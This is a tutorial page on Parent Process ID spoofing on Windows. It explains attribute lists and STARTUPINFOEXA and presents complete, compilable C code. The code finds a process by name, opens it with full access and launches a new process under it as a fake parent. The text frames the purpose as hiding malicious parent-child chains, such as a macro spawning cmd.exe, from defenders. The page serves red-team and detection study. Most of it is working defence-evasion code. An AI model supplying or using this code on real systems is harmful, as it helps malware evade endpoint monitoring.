---
icon: id-badge
---

# PPID Spoofing



### Introduction

[Parent Process ID (PPID) Spoofing](https://attack.mitre.org/techniques/T1134/004/) is a technique used to alter the PPID of a process, effectively disguising the relationship between the child process and its true parent process. This can be accomplished by changing the PPID of the child process to a different value, making it appear as though the process was spawned by a different legitimate Windows process rather than the true parent process.

Security solutions and defenders will often look for abnormal parent-child relationships. For example, if Microsoft Word spawns `cmd.exe` this is generally an indicator of malicious macros being executed. If `cmd.exe` is spawned with a different PPID then it will conceal the true parent process and instead appear as if it was spawned by a different process.

***

### Attributes List

An attribute list is a data structure that stores a list of attributes associated with a process or thread. These attributes can include information such as the priority, scheduling algorithm, state, CPU affinity, and memory address space of the process or thread, among other things. Attribute lists can be used to efficiently store and retrieve information about processes and threads, as well as to modify the attributes of a process or thread at runtime.

Microsoft keeps the internal layout of `PROC_THREAD_ATTRIBUTE_LIST` opaque, meaning there is no public definition for it in the headers. But it has been reversed and looks something like this:

```c
typedef struct _PROC_THREAD_ATTRIBUTE_LIST {
    DWORD     dwFlags;           // internal state flags
    ULONG     ulCount;           // how many attributes you said you'd add
    ULONG     ulReferenceCount;
    ULONG     ulAttributeCount;  // how many have actually been added so far
    struct {
        DWORD_PTR  dwAttributeKey;   // which attribute this is (the key)
        PVOID      lpValue;          // pointer to the value
        SIZE_T     cbSize;           // size of the value in bytes
    } Entries[];                     // array of entries, one per attribute
} PROC_THREAD_ATTRIBUTE_LIST;
```

The important part is the `Entries` array at the bottom. Each entry holds a key and a value. The key is just a number that tells the kernel which attribute this entry represents, and the value is a pointer to the actual data for that attribute. When we fill this list with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`, an entry gets created in this list with the key `0x00020000` and the value being a pointer to our fake parent process handle. That's the only thing the kernel reads to decide which process to stamp as the parent.

***

### EXTENDED\_STARTUPINFO\_PRESENT

The process of spoofing PPID requires the creation of a process using `CreateProcess` with the [EXTENDED\_STARTUPINFO\_PRESENT](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags#flags) flag being set which is used to give further control of the created process. This flag allows some information about the process to be modified, such as the PPID information. Microsoft's documentation on `EXTENDED_STARTUPINFO_PRESENT` states the following:

> The process is created with extended startup information; the lpStartupInfo parameter specifies a STARTUPINFOEX structure.

This means that the [STARTUPINFOEXA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa) data structure is also necessary.

***

### STARTUPINFOEXA Structure

```c
typedef struct _STARTUPINFOEXA {
    STARTUPINFOA                 StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;  // Attributes List
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
```

`STARTUPINFOEXA` is basically just the regular `STARTUPINFOA` with one extra field bolted on: `lpAttributeList`. This is the field that holds our attribute list. When we pass `EXTENDED_STARTUPINFO_PRESENT` to `CreateProcess`, the kernel knows to treat the startup info pointer as a `STARTUPINFOEXA` and go read `lpAttributeList` from it. The attribute list is exactly what we'll be modifying to change the parent PID of the new process. So `lpAttributeList` is the bridge between the list we build and what `CreateProcess` actually acts on.

***

### Initializing The Attributes List

To create our attribute list we use `InitializeProcThreadAttributeList`.

```c
BOOL InitializeProcThreadAttributeList(
    [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
    [in]            DWORD                        dwAttributeCount,
                    DWORD                        dwFlags,
    [in, out]       PSIZE_T                      lpSize
);
```

#### Parameters

**`[out, optional] lpAttributeList`** The attribute list. This parameter can be NULL to determine the buffer size required to support the specified number of attributes.

**`[in] dwAttributeCount`** The count of attributes to be added to the list.

**`dwFlags`** This parameter is reserved and must be zero.

**`[in, out] lpSize`** On input, specifies the size in bytes of the `lpAttributeList` buffer. On output, receives the size in bytes of the initialized attribute list. If the buffer is too small, the call fails and `lpSize` gets the required size written into it.

#### The Two-Call Pattern

The tricky part about this function is that it needs to be called twice. The reason is that `PROC_THREAD_ATTRIBUTE_LIST` is opaque and its size changes depending on how many attributes you plan to store in it. You can't know the size before calling the function, and you can't call the function without knowing how much memory to give it. Classic chicken-and-egg problem.

So what we do is call it the first time with `lpAttributeList` set to `NULL`. This tells the function "don't initialize anything, just calculate and return the size I'll need." The function will fail with `ERROR_INSUFFICIENT_BUFFER` which is completely expected and we just ignore it. After this call, `lpSize` (our `sThreadAttList` variable) holds the exact number of bytes we need.

```c
SIZE_T sThreadAttList = 0;
InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
// fails with ERROR_INSUFFICIENT_BUFFER on purpose, we just want the size
```

Now that we know the size, we allocate heap memory for it:

```c
pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
```

Then we call the function again, this time passing our allocated buffer. The function actually initializes the internal structure in that buffer and gives us back an empty attribute list ready to be filled:

```c
InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList);
```

After the second call we have a valid but empty attribute list sitting in our heap buffer.

***

### Updating The List

Now that we have an initialized attribute list we need to put something into it. That's what `UpdateProcThreadAttribute` is for.

```c
BOOL UpdateProcThreadAttribute(
    [in, out] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
              DWORD                        dwFlags,
    [in]      DWORD_PTR                    Attribute,
    [in]      PVOID                        lpValue,
    [in]      SIZE_T                       cbSize,
              PVOID                        lpPreviousValue,
              PSIZE_T                      lpReturnSize
);
```

This function takes the attribute list we just created and fills one of its `Entries` slots with a key-value pair. The key goes in `Attribute` and the value goes in `lpValue`.

In our case we pass `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` as the key, which is just the constant `0x00020000`. That number is how the kernel knows which attribute this entry represents. The value is `&hParentProcess`, which is a pointer to our fake parent process handle (say, a handle to `explorer.exe`). The `cbSize` is `sizeof(HANDLE)`.

After this call, the attribute list has one entry: key `0x00020000`, value is a pointer to our handle. When `NtCreateUserProcess` runs inside the kernel it walks through the entries in the list, sees the key `0x00020000`, knows this is `PARENT_PROCESS`, dereferences the handle we gave it to get the `_EPROCESS` struct of the fake parent, and writes that process's PID into the `InheritedFromUniqueProcessId` field of the new child process's `_EPROCESS`. That field is what tools like Process Hacker and Task Manager read when they display the parent. Nothing is being copied from the fake parent process, we're just telling the kernel which process handle to use as the source for that one PID field.

```c
UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
```

The last step before calling `CreateProcess` is to plug our filled list into `SiEx.lpAttributeList` so that `CreateProcess` can actually find it. `CreateProcess` doesn't take the attribute list as a direct parameter, it reads it through `STARTUPINFOEXA`. So we do:

```c
SiEx.lpAttributeList = pThreadAttList;
```

Without this line, the list we built never gets seen by `CreateProcess` and the spoof never happens.

***

### CreatePPidSpoofedProcess&#x20;

```c
BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR                               lpPath[MAX_PATH * 2];
	CHAR                               WnDr[MAX_PATH];

	SIZE_T                             sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

	STARTUPINFOEXA                     SiEx = { 0 };
	PROCESS_INFORMATION                Pi = { 0 };

	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

		// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		"C:\\Windows\\System32",
		(LPSTARTUPINFOA)&SiEx,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;


	// Cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}
```

```c
BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
```

The function takes the handle of the process we want to use as the fake parent, the name of the process we want to spawn, and three output parameters to hand back the PID, process handle, and thread handle of the newly created process.

```c
CHAR  lpPath[MAX_PATH * 2];
CHAR  WnDr[MAX_PATH];
SIZE_T sThreadAttList = 0;
PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;
STARTUPINFOEXA SiEx = { 0 };
PROCESS_INFORMATION Pi = { 0 };
```

`lpPath` will hold the full path to the process we're spawning. `WnDr` holds the Windows directory. `sThreadAttList` is where the first call to `InitializeProcThreadAttributeList` writes the required size. `pThreadAttList` is the pointer to the attribute list we'll allocate on the heap. `SiEx` is the extended startup info and `Pi` gets filled by `CreateProcess` with the new process's handles and PID.

```c
RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
```

Zero out both structs. Then set `cb` to the size of `STARTUPINFOEXA`, not `STARTUPINFOA`. This matters because `CreateProcess` reads `cb` to figure out the size of the struct being passed to it.

```c
GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH);
sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
```

Gets the Windows directory (usually `C:\Windows`) and builds the full path to the target process. Using `WINDIR` instead of hardcoding `C:\Windows` means the code works on any machine regardless of install drive.

```c
InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);

InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList);
```

First call gets the required buffer size into `sThreadAttList`. We allocate exactly that many bytes on the heap. Second call actually initializes the structure in that allocated buffer.

```c
UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
```

Puts our key-value pair into the list. Key is `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` (0x00020000) and value is a pointer to the fake parent handle. After this the list is fully built.

```c
SiEx.lpAttributeList = pThreadAttList;
```

Plugs our attribute list into `SiEx` so `CreateProcess` can read it.

```c
CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, "C:\\Windows\\System32", (LPSTARTUPINFOA)&SiEx, &Pi);
```

Spawns the new process. `EXTENDED_STARTUPINFO_PRESENT` signals to the kernel that `lpStartupInfo` is actually a `STARTUPINFOEXA`, so it goes and reads `lpAttributeList`. We cast `&SiEx` down to `LPSTARTUPINFOA` because that's what the parameter type is, but the kernel treats it as `STARTUPINFOEXA` because of the flag. Inside `NtCreateUserProcess`, the kernel finds the attribute list, sees key `0x00020000`, dereferences our handle, and writes the fake parent's PID into `InheritedFromUniqueProcessId` of the new process.

```c
*dwProcessId = Pi.dwProcessId;
*hProcess    = Pi.hProcess;
*hThread     = Pi.hThread;

DeleteProcThreadAttributeList(pThreadAttList);
CloseHandle(hParentProcess);
```

Return the new process info through the output parameters, then clean up. `DeleteProcThreadAttributeList` frees the internal resources of the attribute list and then we `HeapFree` the buffer (or in this code it just gets cleaned up). We also close the parent handle since we no longer need it.

***

### Implementation

```c
#include <stdio.h>
#include <Windows.h>
#include <psapi.h>
#pragma warning(disable : 4996)

BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwParentPid, HANDLE* hParentProcess) {

	DWORD		adwProcesses[1024 * 2],
		dwReturnLen1 = NULL,
		dwReturnLen2 = NULL,
		dwNmbrOfPids = NULL;

	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;

	WCHAR		szProc[MAX_PATH];

	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		if (adwProcesses[i] != NULL) {

			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {

				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						if (wcscmp(szProcName, szProc) == 0) {
							wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", szProc, adwProcesses[i]);
							*pdwParentPid = adwProcesses[i];
							*hParentProcess = hProcess;
							break;
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	if (*pdwParentPid == NULL || *hParentProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR                               lpPath[MAX_PATH * 2];
	CHAR                               WnDr[MAX_PATH];

	SIZE_T                             sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

	STARTUPINFOEXA                     SiEx = { 0 };
	PROCESS_INFORMATION                Pi = { 0 };

	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// First call - just to get the required buffer size
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Second call - actually initialize the list
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Fill the list with our key-value pair (key = PARENT_PROCESS, value = hParentProcess handle)
	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Plug the list into SiEx so CreateProcess can read it
	SiEx.lpAttributeList = pThreadAttList;

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		"C:\\Windows\\System32",
		(LPSTARTUPINFOA)&SiEx,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

int main(int argc, char* argv[]) {

	DWORD pdwParentPid = 0;
	HANDLE hParentProcess = NULL;
	DWORD dwProcessId = 0;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	if (!GetRemoteProcessHandle(L"sublime_text.exe", &pdwParentPid, &hParentProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	printf("[+] DONE \n");
	printf("[i] Found Parent Pid: %d \n", pdwParentPid);

	if (!CreatePPidSpoofedProcess(hParentProcess, "RuntimeBroker.exe", &dwProcessId, &hProcess, &hThread)) {
		printf("[!] CreatePPidSpoofedProcess Failed with the Error: %d \n", GetLastError());
		return FALSE;
	}
}
```

***

### Result

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
